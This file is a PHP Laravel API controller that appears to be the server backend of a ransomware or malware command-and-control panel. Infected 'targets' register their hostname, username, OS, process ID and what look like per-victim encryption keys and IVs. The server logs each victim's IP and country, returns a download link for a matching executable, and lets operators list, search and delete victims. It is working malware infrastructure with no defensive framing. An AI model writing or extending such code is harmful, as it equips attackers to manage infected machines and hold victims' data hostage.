<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\Executable;
use App\Models\Target;
use Illuminate\Http\Request;
use Stevebauman\Location\Facades\Location;

class TargetController extends Controller
{
    public function getTargets(Request $request)
    {
        $limit = $request->get('limit', 10);
        $targets = Target::select('machine_id', 'hostname', 'username', 'os', 'ip', 'process_id', 'created_at', 'updated_at')
            ->orderBy('created_at', 'desc')
            ->paginate($limit);

       $targets->getCollection()->transform(function ($target) {
            $target->country = $this->isPrivateIp($target->ip) ? 'Local' : Location::get($target->ip)->countryName;
            return $target;
        });

        return response()->json([
            'status' => 'success',
            'message' => 'success',
            'data' => $targets
        ]);
    }

    public function create(Request $request)
    {
        $data = $request->validate([
            'machine_id' => 'required|string',
            'hostname' => 'required|string',
            'username' => 'required|string',
            'os' => 'required|string',
            'process_id' => 'required|string',
            'key' => 'required|string|size:32',
            'iv' => 'required|string|size:16',
	    'hash' => 'required|string'
        ]);

        $target = Target::updateOrCreate(['machine_id' => $data['machine_id']], $data);
        $target->ip = $request->header('X-Real-IP', $request->header('X-Forwarded-For', $request->ip()));
        $target->save();

        $exe = Executable::where('hash', $data['hash'])->first();

        return response()->json([
            'status' => 'success',
            'message' => 'success',
            'data' => $exe ? asset($data['path']) : null
        ]);
    }

    public function search(Request $request)
    {
        $limit = $request->get('limit', 10);

        $data = $request->validate([
            'query' => 'required|string'
        ]);

        $targets = Target::where('hostname', 'LIKE', '%' . $data['query'] . '%')
            ->orWhere('username', 'LIKE', '%' . $data['query'] . '%')
            ->orWhere('os', 'LIKE', '%' . $data['query'] . '%')
            ->select('machine_id', 'hostname', 'username', 'os', 'ip', 'process_id', 'created_at', 'updated_at')
            ->orWhere('ip', 'LIKE', '%' . $data['query'] . '%')
            ->orderBy('created_at', 'desc')
            ->paginate($limit);

	    $targets->getCollection()->transform(function ($target) {
            $target->country = $this->isPrivateIp($target->ip) ? 'Local' : Location::get($target->ip)->countryName;

            return $target;
        });

        return response()->json([
            'status' => 'success',
            'message' => 'success',
            'data' => $targets
        ]);
    }

    private function isPrivateIp(string $ip): bool
    {
        return !filter_var(
            $ip,
            FILTER_VALIDATE_IP,
            FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE
        );
    }

    public function delete(Request $request, $id)
    {
        $target = Target::where('machine_id', $id)->first();
        if ($target) {
            $target->delete();
            return response()->json(['status' => 'success', 'message' => 'Target deleted']);
        }
        return response()->json(['status' => 'failed', 'message' => 'Target not found'], 404);
    }
}
